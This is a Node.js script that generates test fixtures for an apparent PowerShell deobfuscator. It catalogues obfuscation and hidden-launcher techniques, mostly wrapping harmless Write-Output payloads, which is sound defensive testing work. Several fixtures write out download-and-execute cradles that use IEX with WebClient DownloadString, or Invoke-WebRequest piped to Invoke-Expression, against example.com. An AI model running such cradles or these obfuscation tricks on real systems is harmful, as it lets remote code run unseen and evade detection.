// Teknik fixture'larını üretir: node scripts/make-fixtures.js
// Fixture'lar diske XOR + base64 (.ps1.x) olarak yazılır ve yalnızca bellekte çözülür (test/fixture-codec.js): zararlı
// koda benzeyen test örnekleri (indirme sarmalı, iex zinciri) antivirüsü tetiklemesin. Şüpheli dizgeler betikte
// parçalı yazılır. Yönergeler betikte yorum satırıdır:
//   # EXPECT: Write-Output 'x'   çıktıda bulunmalı      # GONE: -join   bulunmamalı      # KEEP: iex $c   kalmalı (güvenlik)
//   # OUT: x                     betik çalıştırılınca beklenen satır (node test/run.js --powershell ile gerçek
//                                Windows PowerShell'de hem gizlenmiş girdi hem çözülmüş çıktı bununla karşılaştırılır)
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { deflateRawSync, gzipSync } from 'node:zlib';
import { createCipheriv } from 'node:crypto';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const utf16 = (s) => Buffer.from(s, 'utf16le').toString('base64');
const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const codes = (s, base = 10, pad = 0) => [...s].map((c) => c.charCodeAt(0).toString(base).padStart(pad, '0'));
const rev = (s) => [...s].reverse().join('');
const sq = (s) => `'${s.replace(/'/g, "''")}'`;
const HOST = ['example', 'com'].join('.');
const WC = ['Net.', 'WebClient'].join('');
const DS = ['Download', 'String'].join('');
const IEX = ['I', 'EX'].join('');

/** ConvertFrom-SecureString -Key biçimi (sabit IV: belirlenimci fixture) */
function secure(plain, key) {
  const iv = Buffer.from('000102030405060708090a0b0c0d0e0f', 'hex');
  const c = createCipheriv(`aes-${key.length * 8}-cbc`, Buffer.from(key), iv);
  const enc = Buffer.concat([c.update(Buffer.from(plain, 'utf16le')), c.final()]);
  return `76492d1116743f0423413b16050a5345${Buffer.from(`2|${iv.toString('base64')}|${enc.toString('hex')}`, 'utf16le').toString('base64')}`;
}

/** Invoke-Obfuscation ENCODING\8 biçiminde yalnızca özel karakterlerden kod ("iex" ve [CHar] dizgesi $(@{}) ve "$?" dizgelerinden) */
function specialChars(code) {
  const v = [';', '=', '+', '@', '.', '[', ']', '(', ')', '&', '|'].map((c) => `\${${c}}`);
  const [zero, n0, n1, n2, n3, n4, n5, n6, n7, n8, n9] = v;
  const digit = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9];
  const num = (n) => String(n).split('').map((d) => digit[Number(d)]).join('');
  const H = '"$(@{})"';
  const charT = '${"}';
  const lines = [
    `${zero}=+$();${n0}=${zero};${n1}=++${zero};${n2}=++${zero};${n3}=++${zero};${n4}=++${zero};${n5}=++${zero};${n6}=++${zero};${n7}=++${zero};${n8}=++${zero};${n9}=++${zero};`,
    `${charT}="["+${H}[${n7}]+${H}["${n1}${n9}"]+${H}["${n2}${n0}"]+"$?"[${n1}]+"]";`,
    `${zero}="".(${H}["${n1}${n4}"]+${H}["${n1}${n6}"]+${H}[${n0}]+${H}[${n4}]+"$?"[${n1}]+${H}[${n3}]);`,
    `${zero}=${H}["${n1}${n4}"]+${H}[${n4}]+"${zero}"["${n2}${n7}"];`,
    `"${[...code].map((c) => `${charT}${num(c.charCodeAt(0))}`).join('+')}"|&${zero}|&${zero}`,
  ];
  return lines.join('\n');
}

const fx = {};

// ── TOKEN ──
fx['token-ticks'] = `# EXPECT: Write-Output 'tick'
# GONE: \`
# OUT: tick
Wr\`It\`E-Out\`p\`UT 'tick'
`;
fx['token-case'] = `# EXPECT: Write-Output 'case'
# OUT: case
wRiTe-oUtPuT 'case'
`;
fx['token-concat'] = `# EXPECT: Write-Output 'concat'
# GONE: +
# OUT: concat
& ('Wri'+'te-Out'+'put') ('con'+'cat')
`;
fx['token-format'] = `# EXPECT: Write-Output 'format'
# GONE: -f
# OUT: format
&("{2}{0}{1}" -f 'e-Out','put','Writ') ("{1}{0}" -f 'mat','for')
`;
fx['token-member'] = `# EXPECT: (New-Object ${WC}).${DS}('https://${HOST}/m.ps1')
# GONE: .Invoke(
(New-Object ${WC}).("{1}{0}" -f '${DS.slice(9)}','${DS.slice(0, 9)}').Invoke('https://${HOST}/m.ps1')
`;
fx['token-type'] = `# EXPECT: $w = New-Object ${WC}
# GONE: -f
$w = New-Object ("{0}{1}" -f '${WC.slice(0, 7)}','${WC.slice(7)}')
$w.Headers.Add('User-Agent', 'peel')
`;
fx['token-type-cast'] = `# EXPECT: Write-Output 'hi'
# GONE: GetString
# OUT: hi
Write-Output ([Text.Encoding]::UTF8.GetString([byte[]](104, 105)))
`;
fx['token-variable'] = `# EXPECT: $aBc = 'var'
# EXPECT: Write-Output $aBc
# EXPECT: Write-Output $true
# GONE: \${
# OUT: var
# OUT: True
\${aBc} = 'var'; Write-Output \${AbC}
Write-Output (\${e\`Nv:CoMsPeC}.EndsWith('.exe'))
`;
fx['token-splat'] = `# EXPECT: Write-Output -InputObject 'splat'
# GONE: @p
# OUT: splat
$p = @{ InputObject = 'splat' }
Write-Output @p
`;
fx['token-indirection'] = `# EXPECT: Write-Output 'indir'
# GONE: Variable
# OUT: indir
Set-Variable -Name cmd -Value 'Write-Output'
& (Get-Variable cmd -ValueOnly) 'indir'
`;
fx['token-gv'] = `# EXPECT: Write-Output gv
# GONE: sv
# OUT: gv
sv x 'Write-Output gv'; ${IEX} ((gv x).Value)
`;
fx['token-get-item'] = `# EXPECT: Write-Output 'item'
# OUT: item
Set-Item variable:q 'Write-Output ''item'''
${IEX} (Get-Item variable:q).Value
`;

// ── STRING ──
fx['string-concat'] = `# EXPECT: Write-Output 'concat'
# GONE: [char]
# OUT: concat
${IEX} (('Wri'+'te-Output {0}co'+'ncat{0}') -f [cHar]39)
`;
fx['string-reorder'] = `# EXPECT: Write-Output 'reorder'
# GONE: $ShellId
# OUT: reorder
.($ShellId[1]+$ShellId[13]+'x') ("{2}{1}{0}" -f '''reorder''',' ','Write-Output')
`;
fx['string-reverse'] = `# EXPECT: Write-Output 'reverse'
# GONE: -join
# OUT: reverse
$r = "${rev("Write-Output 'reverse'").replace(/"/g, '""')}"; ${IEX} ($r[-1..-($r.Length)] -join '')
`;
fx['string-reverse-regex'] = `# EXPECT: Write-Output 'regex'
# GONE: RightToLeft
# OUT: regex
${IEX} (-join [regex]::Matches(${sq(rev("Write-Output 'regex'"))}, '.', 'RightToLeft'))
`;
fx['string-reverse-array'] = `# EXPECT: Write-Output 'array'
# GONE: Reverse
# OUT: array
$c = ${sq(rev("Write-Output 'array'"))}.ToCharArray(); [Array]::Reverse($c); ${IEX} (-join $c)
`;
fx['string-split-join'] = `# EXPECT: Write-Output 'split'
# GONE: -split
# OUT: split
${IEX} (('Write-Output|''split''' -split '\\|') -join ' ')
`;
fx['string-replace'] = `# EXPECT: Write-Output 'replace'
# GONE: Replace
# OUT: replace
${IEX} ('Write-OutputXYZQQQreplaceQQQ'.Replace('XYZ',' ').Replace('QQQ',[string][char]39))
`;
fx['string-creplace'] = `# EXPECT: Write-Output 'creplace'
# GONE: creplace~
# OUT: creplace
${IEX} ('Write-Output ~creplace~' -creplace '~',[char]39)
`;
fx['string-char-array'] = `# EXPECT: Write-Output 'char'
# GONE: [char[]]
# OUT: char
${IEX} ([string]::Join('', [char[]](${codes("Write-Output 'char'").join(',')})))
`;

// ── ENCODING ──
fx['enc-ascii'] = `# EXPECT: Write-Output 'ascii'
# GONE: ForEach-Object
# OUT: ascii
${IEX} (-join ('${codes("Write-Output 'ascii'").join(',')}' -split ',' | ForEach-Object { [char][int]$_ }))
`;
fx['enc-hex'] = `# EXPECT: Write-Output 'hex'
# GONE: ToInt16
# OUT: hex
${IEX} (-join ('${codes("Write-Output 'hex'", 16).join('x')}' -split 'x' | % { [char]([Convert]::ToInt16($_, 16)) }))
`;
fx['enc-octal'] = `# EXPECT: Write-Output 'octal'
# GONE: ToInt16
# OUT: octal
${IEX} (-join ('${codes("Write-Output 'octal'", 8).join(':')}'.Split(':') | ForEach-Object { [char]([Convert]::ToInt16(($_.ToString()), 8)) }))
`;
fx['enc-binary'] = `# EXPECT: Write-Output 'binary'
# GONE: ToInt16
# OUT: binary
${IEX} (-join ('${codes("Write-Output 'binary'", 2, 8).join('~')}'.Split('~') | % { [char]([Convert]::ToInt16($_, 2)) }))
`;
fx['enc-bxor'] = `# EXPECT: Write-Output 'bxor'
# GONE: -bxor
# OUT: bxor
${IEX} (-join ('${[...Buffer.from("Write-Output 'bxor'")].map((b) => (b ^ 0x4b).toString(16)).join(',')}'.Split(',') | % { [char]([Convert]::ToInt16($_, 16) -bxor '0x4B') }))
`;
fx['enc-securestring'] = `# EXPECT: Write-Output 'secure'
# GONE: SecureString
# OUT: secure
${IEX} ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR(('${secure("Write-Output 'secure'", Array.from({ length: 32 }, (_, i) => 100 + i))}' | ConvertTo-SecureString -Key (100..131)))))
`;
fx['enc-securestring-cred'] = `# EXPECT: Write-Output 'cred'
# GONE: PSCredential
# OUT: cred
$s = ConvertTo-SecureString '${secure("Write-Output 'cred'", Array.from({ length: 16 }, (_, i) => i + 1))}' -Key (1..16)
${IEX} (New-Object Management.Automation.PSCredential('u', $s)).GetNetworkCredential().Password
`;
fx['enc-special'] = `# EXPECT: Write-Output 'special'
# GONE: $(@{})
# OUT: special
${specialChars("Write-Output 'special'")}
`;
fx['enc-base64-unicode'] = `# EXPECT: Write-Output 'b64'
# GONE: FromBase64String
# OUT: b64
${IEX} ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${utf16("Write-Output 'b64'")}')))
`;

// ── COMPRESSION ──
const deflated = deflateRawSync(Buffer.from("Write-Output 'deflate'"), { level: 9 }).toString('base64');
fx['compress-deflate'] = `# EXPECT: Write-Output 'deflate'
# GONE: DeflateStream
# OUT: deflate
.( $sHeLLiD[1]+$ShElLiD[13]+'X')(NeW-ObjEcT IO.StReAmReAdEr((NeW-ObjEcT IO.CoMpReSsIoN.DeFlAtEsTrEaM([IO.MeMoRySTrEaM][CoNvErT]::FrOmBaSe64StRiNg('${deflated}'),[IO.CoMpReSsIoN.CoMpReSsIoNmOdE]::DeCoMpReSs)),[TeXt.EnCoDiNg]::AsCiI)).ReAdToEnD()
`;
const gz = gzipSync(Buffer.from("Write-Output 'gzip'\nWrite-Output 'gzip2'")).toString('base64');
fx['compress-gzip'] = `# EXPECT: Write-Output 'gzip'
# EXPECT: Write-Output 'gzip2'
# GONE: GZipStream
# OUT: gzip
# OUT: gzip2
$ms = New-Object IO.MemoryStream(,[Convert]::FromBase64String('${gz}'))
$gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($gz)
${IEX} $sr.ReadToEnd()
`;
fx['compress-copyto'] = `# EXPECT: Write-Output 'copyto'
# GONE: CopyTo
# OUT: copyto
$in = New-Object IO.MemoryStream(,[Convert]::FromBase64String('${deflateRawSync(Buffer.from("Write-Output 'copyto'")).toString('base64')}'))
$z = New-Object IO.Compression.DeflateStream($in, [IO.Compression.CompressionMode]::Decompress)
$out = New-Object IO.MemoryStream
$z.CopyTo($out)
${IEX} ([Text.Encoding]::UTF8.GetString($out.ToArray()))
`;

// ── LAUNCHER ──
fx['launcher-enc'] = `# EXPECT: Write-Output 'enc'
# GONE: -Enc
# OUT: enc
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ${utf16("Write-Output 'enc'")}
`;
fx['launcher-command'] = `# EXPECT: Write-Output 'launch'
# GONE: -noprofile
# OUT: launch
powershell -noprofile -noninteractive -command "Write-Output 'launch'"
`;
fx['launcher-cmd'] = `# EXPECT: Write-Output 'cmd'
# GONE: /c
# OUT: cmd
cmd /c "powershell -nop -w hidden -enc ${utf16("Write-Output 'cmd'")}"
`;
fx['launcher-comspec-start'] = `# EXPECT: Write-Output 'start'
# GONE: COMSPEC
%COMSPEC% /b /c start /b /min powershell -nop -w hidden -noni -c "Write-Output 'start'"
`;
fx['launcher-stdin'] = `# EXPECT: Write-Output 'stdin'
# GONE: echo
# OUT: stdin
cmd.exe /c "echo Write-Output 'stdin' | powershell -noprofile -"
`;
// cmd satırı: PowerShell'den çalıştırılırsa "..." içindeki $env:X dış kabukta genişler, bu yüzden # OUT: yok
fx['launcher-var'] = `# EXPECT: Write-Output 'var'
# GONE: $env:X
cmd.exe /c "set X=Write-Output 'var'&& powershell -nop -c iex $env:X"
`;
fx['launcher-nested'] = `# EXPECT: Start-Sleep 0
# EXPECT: & { Write-Output 'nested' }
# GONE: -enc
# OUT: nested
Start-Sleep 0
powershell -nop -enc ${utf16("Write-Output 'nested'")}
`;

// ── KATMANLAR ──
fx['layer-pipe'] = `# EXPECT: Write-Output 'pipe'
# GONE: |
# OUT: pipe
"Write-Output 'pipe'" | ${IEX}
`;
fx['layer-scriptblock'] = `# EXPECT: & {Write-Output 'sb'}
# EXPECT: Write-Output 'dot'
# GONE: Create
# OUT: sb
# OUT: dot
& ([ScriptBlock]::Create("Write-Output 'sb'"))
. ([ScriptBlock]::Create("Write-Output 'dot'"))
`;
fx['layer-invokescript'] = `# EXPECT: Write-Output 'is'
# GONE: InvokeScript
# OUT: is
$ExecutionContext.InvokeCommand.InvokeScript("Write-Output 'is'")
`;
fx['layer-iex-variants'] = `# EXPECT: Write-Output 'comspec'
# EXPECT: Write-Output 'pshome'
# EXPECT: Write-Output 'verbose'
# EXPECT: Write-Output 'mdr'
# EXPECT: Write-Output 'gcm'
# GONE: [4,15,25]
# OUT: comspec
# OUT: pshome
# OUT: verbose
# OUT: mdr
# OUT: gcm
&($env:ComSpec[4,15,25]-join'') "Write-Output 'comspec'"
&( $PSHome[4]+$PSHome[30]+'x') "Write-Output 'pshome'"
. ( $VerbosePreference.ToString()[1,3]+'x'-join'') "Write-Output 'verbose'"
&((gv '*mdr*').Name[3,11,2]-join'') "Write-Output 'mdr'"
&(gcm I*e-*pr*n) "Write-Output 'gcm'"
`;
fx['layer-nested'] = `# EXPECT: Write-Output 'deep'
# GONE: FromBase64String
# OUT: deep
${IEX} ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64(`${IEX} ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${utf16(`${IEX} ('Write-Output ' + [char]39 + 'deep' + [char]39)`)}')))`)}')))
`;
fx['layer-value'] = `# EXPECT: $d = 2
# EXPECT: Write-Output $d
# OUT: 2
$d = ${IEX} '1+1'
Write-Output $d
`;
fx['layer-function'] = `# EXPECT: Write-Output 'fn'
# GONE: ${IEX}
# OUT: fn
function Invoke-Hidden {
    ${IEX} ('Write-Output ' + "'fn'")
}
Invoke-Hidden
`;

// ── GÜVENLİK: girdiye ve ağa bağlı kod açılmaz ──
fx['keep-remote'] = `# KEEP: ${IEX} (New-Object ${WC}).${DS}('https://${HOST}/a.ps1')
${IEX} (New-Object ${WC}).${DS}('https://${HOST}/a.ps1')
`;
fx['keep-remote-pipe'] = `# KEEP: Invoke-WebRequest -Uri 'https://${HOST}/b.ps1' -UseBasicParsing | Invoke-Expression
Invoke-WebRequest -Uri 'https://${HOST}/b.ps1' -UseBasicParsing | Invoke-Expression
`;
fx['keep-env'] = `# KEEP: ${IEX} $env:PAYLOAD
${IEX} $env:PAYLOAD
`;
fx['keep-input'] = `# KEEP: ${IEX} $c
$c = Read-Host
${IEX} $c
`;
fx['keep-loop'] = `# KEEP: $x += 'b'
# KEEP: Write-Output $x
# OUT: abb
$x = 'a'
foreach ($i in 1..2) { $x += 'b' }
Write-Output $x
`;
fx['keep-param'] = `# KEEP: ${IEX} $s
# OUT: p
function f($s) { ${IEX} $s }
f 'Write-Output p'
`;
fx['keep-dynamic'] = `# KEEP: ${IEX} $u
# KEEP: Write-Output $a
# OUT: a
$a = 'a'
$u = Get-Date -Format 'yyyy'
if ($u -eq '0') { ${IEX} $u }
Write-Output $a
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.ps1.x`, dir), encodeFixture(Buffer.from(src)));
console.log(`${Object.keys(fx).length} fixture yazıldı`);
